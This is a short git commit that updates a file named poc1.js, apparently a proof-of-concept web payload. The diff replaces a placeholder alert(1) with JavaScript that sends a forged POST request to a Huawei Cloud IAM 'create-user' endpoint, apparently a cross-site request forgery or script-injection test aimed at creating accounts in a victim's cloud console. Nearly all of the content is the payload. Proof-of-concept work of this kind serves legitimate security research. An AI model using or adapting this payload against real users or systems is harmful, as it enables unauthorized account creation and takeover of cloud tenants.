bb8c9137639e71a9b60c203aa0b8e471a273316b
NT0-0 <31346815+NT0-0@users.noreply.github.com>
2019-09-30 15:46:37 +0800

    Update poc1.js

--- poc1.js
+++ poc1.js
@@ -1,1 +1,5 @@
-alert(1);
+var xhr = new XMLHttpRequest();
+xhr.open("POST", 'https://console.huaweicloud.com/iam/server/create-user', true);
+xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+xhr.onload = function () {};
+xhr.send("foo=bar"); 
